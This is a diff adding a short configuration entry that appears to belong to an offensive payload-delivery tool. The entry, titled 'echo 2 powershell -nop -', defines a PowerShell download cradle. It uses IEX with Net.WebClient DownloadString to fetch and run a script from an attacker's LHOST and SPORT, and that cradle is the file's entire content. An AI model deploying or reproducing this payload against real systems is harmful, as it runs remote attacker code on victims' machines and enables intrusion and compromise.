@@ -1,0 +1,5 @@
+title=echo 2 powershell -nop -
+info=Download the payload using powershell code echoed to powershell -nop -
+required_opts=LHOST;SPORT
+http_requests=1
+payload=IEX(New-Object Net.WebClient).DownloadString('http://LHOST:SPORT/FILENAME')
